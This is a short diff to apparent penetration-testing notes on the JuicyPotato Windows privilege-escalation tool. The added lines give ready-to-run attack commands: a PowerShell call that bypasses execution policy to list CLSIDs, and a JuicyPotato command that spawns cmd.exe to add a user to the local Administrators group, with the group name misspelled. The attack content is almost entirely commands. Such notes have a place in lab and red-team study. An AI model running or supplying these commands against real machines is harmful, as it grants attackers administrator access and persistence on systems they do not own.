@@ -19,3 +19,7 @@ https://github.com/ohpe/juicy-potato
 
 We need a vali CLSID and Port Number
 https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1
+powershell -executionpolicy bypass -file GetCLSID.ps1 > clsid.txt
+
+DEFAULT
+JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c net localgroup Admnistrators Test /add" -l 1234
